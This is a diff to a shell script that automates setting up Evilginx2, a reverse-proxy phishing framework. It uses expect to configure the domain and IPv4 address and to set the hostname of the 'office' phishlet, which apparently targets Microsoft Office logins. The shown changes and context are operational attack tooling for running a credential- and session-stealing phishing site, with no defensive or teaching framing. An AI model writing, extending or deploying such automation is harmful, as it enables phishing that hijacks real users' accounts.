@@ -74,7 +74,7 @@ read -p "Enter Cloudflare Zone ID: " CF_ZONE_ID
 # Evilginx Automation Steps #
 #############################
 
-# First Evilginx Run - Start and Exit Immediately
+# First Evilginx Run - Start and Exit Immediately to generate the config
 log_message "[+] Starting Evilginx for the first time and exiting..."
 expect <<EOF | tee -a "$LOG_FILE"
     spawn ./evilginx2
@@ -127,10 +127,14 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-# Second Evilginx Run - Execute Commands via expect
+# Second Evilginx Run - Execute Commands via expect (with config domain and ipv4 commands added)
 log_message "[+] Restarting Evilginx and executing commands..."
 expect <<EOF | tee -a "$LOG_FILE"
     spawn ./evilginx2
+    expect "evilginx2 >"
+    send "config domain $DOMAIN\r"
+    expect "evilginx2 >"
+    send "config ipv4 $EXTERNAL_IPV4\r"
     expect "evilginx2 >"
     send "phishlets hostname office $DOMAIN\r"
     expect "evilginx2 >"
